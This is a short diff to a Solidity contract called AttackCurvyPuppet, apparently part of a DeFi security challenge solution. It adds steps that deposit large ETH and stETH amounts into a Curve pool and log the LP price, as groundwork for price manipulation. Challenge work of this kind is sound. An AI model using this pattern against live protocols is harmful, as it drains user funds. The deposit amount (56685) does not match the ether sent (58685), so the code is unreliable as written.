@@ -246,10 +246,17 @@ contract AttackCurvyPuppet {
         weth.withdraw(58685 ether);
         
         console.log("LP token price before removing liquidity", curvePool.get_virtual_price());
-        // Swap ETH for stETH
+        // to use exchange function from the curve pool to swap ETH for stETH
         stETH.approve(address(curvePool), type(uint256).max);
 
         uint256[2] memory amount;
+        amount[0] = 56685 ether;
+        amount[1] = stETH.balanceOf(address(this));
+        console.log("attacker weth balance", weth.balanceOf(address(this)));
+        console.log("attacker eth balance", address(this).balance);
+        curvePool.add_liquidity{value: 58685 ether}(amount, 0);
+
+        
     }
 
     function removeLiquidity() public {
